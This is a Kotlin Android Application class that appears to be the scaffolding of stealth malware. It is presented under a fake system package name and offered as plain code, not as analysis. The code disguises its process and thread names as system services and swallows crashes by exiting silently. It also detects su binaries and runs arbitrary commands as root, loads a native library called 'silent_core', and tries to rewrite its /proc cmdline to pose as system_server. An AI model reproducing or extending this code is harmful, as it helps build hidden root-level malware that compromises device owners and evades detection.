package com.android.system.daemon

import android.app.Application
import android.os.Handler
import android.os.Looper
import android.os.Process
import java.io.DataOutputStream
import kotlin.random.Random

class App : Application() {

    private val procPool = listOf(
        "system_service",
        "media_daemon",
        "wifi_service",
        "cloud_service",
        "log_daemon"
    )

    private val threadPool = listOf(
        "system_io",
        "system_work",
        "net_service",
        "dev_monitor"
    )

    var customSuCmd: String = ""

    external fun silentCoreInit(): Int
    external fun getCoreStatus(): String

    override fun onCreate() {
        super.onCreate()

        Thread.setDefaultUncaughtExceptionHandler { _, _ ->
            System.exit(0)
        }

        Handler(Looper.getMainLooper()).post {
            initBackgroundTask()
        }
    }

    private fun initBackgroundTask() {
        hideAllTrace()
        autoDetectSu()
        loadNativeCore()
    }

    private fun autoDetectSu() {
        if (customSuCmd.isNotBlank()) return
        val suList = listOf("su", "su -c", "/system/bin/su", "/sbin/su")
        for (cmd in suList) {
            if (testSu(cmd)) {
                customSuCmd = cmd
                break
            }
        }
    }

    private fun testSu(su: String): Boolean {
        return try {
            val p = Runtime.getRuntime().exec("$su id")
            p.waitFor()
            p.exitValue() == 0
        } catch (_: Exception) {
            false
        }
    }

    private fun loadNativeCore() {
        runCatching {
            System.loadLibrary("silent_core")
            silentCoreInit()
        }
    }

    private fun hideAllTrace() {
        runCatching {
            val method = Process::class.java.getDeclaredMethod("setArgV0", String::class.java)
            method.isAccessible = true
            method.invoke(null, procPool.random())
        }
        Thread.currentThread().name = threadPool.random()
    }

    fun execSu(cmd: String): Boolean {
        if (customSuCmd.isBlank()) return false
        return runCatching {
            val su = Runtime.getRuntime().exec(customSuCmd)
            val dos = DataOutputStream(su.outputStream)
            dos.writeBytes("$cmd\n")
            dos.writeBytes("exit\n")
            dos.flush()
            dos.close()
            su.destroy()
            true
        }.getOrDefault(false)
    }

    fun hideSelfProcess() {
        if (!testSu(customSuCmd)) return
        val pid = Process.myPid()
        val hideCmd = "mv /proc/$pid/cmdline /proc/$pid/cmdline_bak;echo system_server > /proc/$pid/cmdline"
        execSu(hideCmd)
    }
}

